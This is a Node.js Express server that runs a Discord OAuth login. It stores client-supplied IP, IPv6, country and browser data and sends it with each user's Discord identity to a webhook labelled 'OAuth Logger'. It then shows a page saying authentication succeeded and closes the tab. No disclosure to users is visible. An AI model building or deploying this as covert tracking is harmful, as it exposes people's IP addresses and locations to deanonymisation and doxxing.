require('dotenv').config();
const express = require('express');
const path = require('path');
const session = require('express-session');
const passport = require('passport');
const DiscordStrategy = require('passport-discord').Strategy;
const fetch = require('node-fetch');

const {
  DISCORD_CLIENT_ID,
  DISCORD_CLIENT_SECRET,
  DISCORD_CALLBACK_URL,
  DISCORD_WEBHOOK_URL,
  SESSION_SECRET,
  PORT
} = process.env;

const app = express();

// --- Session & Passport setup ---
app.use(session({
  secret: SESSION_SECRET,
  resave: false,
  saveUninitialized: false
}));

app.use(passport.initialize());
app.use(passport.session());

passport.use(
  new DiscordStrategy(
    {
      clientID: DISCORD_CLIENT_ID,
      clientSecret: DISCORD_CLIENT_SECRET,
      callbackURL: DISCORD_CALLBACK_URL,
      scope: ['identify', 'email']
    },
    async (accessToken, refreshToken, profile, done) => {
      // The user’s Discord profile is passed here
      return done(null, profile);
    }
  )
);

passport.serializeUser((user, done) => {
  done(null, user);
});
passport.deserializeUser((obj, done) => {
  done(null, obj);
});

// --- Serve the static front-end from the "public" folder ---
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());

// ------------- Routes -------------
// Home (login) page is served by index.html in "public"

// POST /userinfo: store client-side IP & geolocation data in session
app.post('/userinfo', (req, res) => {
  req.session.userInfo = req.body; // Save IP, IPv6, country, browser, etc.
  return res.json({ status: 'ok' });
});

// Discord OAuth start
app.get('/auth/discord', passport.authenticate('discord'));

// Discord OAuth callback
app.get(
  '/auth/discord/callback',
  passport.authenticate('discord', { failureRedirect: '/' }),
  async (req, res) => {
    // If authentication succeeds, we have:
    // req.user -> Discord profile
    // req.session.userInfo -> IP/geo info from client
    const { userInfo } = req.session || {};
    const userAgent = userInfo?.browser || 'Unknown';
    const ip = userInfo?.ipv4 || 'Unknown';
    const ip6 = userInfo?.ipv6 || 'Unknown';
    const country = userInfo?.country || 'Unknown';
    const accessedAt = userInfo?.accessedAt || new Date().toLocaleString();

    const { username, discriminator, id, avatar } = req.user || {};
    const avatarURL = avatar
      ? `https://cdn.discordapp.com/avatars/${id}/${avatar}.png`
      : 'https://cdn.discordapp.com/embed/avatars/0.png'; // Default avatar if none

    // Prepare embed
    const embedData = {
      username: 'OAuth Logger',
      embeds: [
        {
          title: 'New OAuth Login',
          description: `A user just logged in via Discord!`,
          color: 3447003,
          thumbnail: { url: avatarURL },
          fields: [
            {
              name: 'User',
              value: `${username}#${discriminator} (ID: ${id})`
            },
            {
              name: 'IPv4',
              value: ip,
              inline: false
            },
            {
              name: 'IPv6',
              value: ip6,
              inline: false
            },
            {
              name: 'Country',
              value: country,
              inline: false
            },
            {
              name: 'Browser / User-Agent',
              value: userAgent,
              inline: false
            },
            {
              name: 'Accessed At',
              value: accessedAt,
              inline: false
            }
          ]
        }
      ]
    };

    try {
      await fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(embedData)
      });
      console.log('Webhook sent successfully!');
    } catch (err) {
      console.error('Error sending webhook:', err);
    }

    // Clear session userInfo if desired
    req.session.userInfo = null;

    // Redirect to a page that automatically closes the tab
    return res.redirect('/close-tab');
  }
);

// A page that closes the tab automatically
app.get('/close-tab', (req, res) => {
  // Basic HTML + JS that closes the tab
  res.send(`
    <html>
      <head>
        <meta charset="UTF-8"/>
        <title>Auth Success</title>
      </head>
      <body style="background: #f0f0f0; text-align: center; padding-top: 40px;">
        <h2>認証成功</h2>
        <p>このタブは自動的に閉じられます。</p>
        <script>
          // Attempt to close the window/tab after a slight delay
          setTimeout(() => {
            window.close();
          }, 2000);
        </script>
      </body>
    </html>
  `);
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
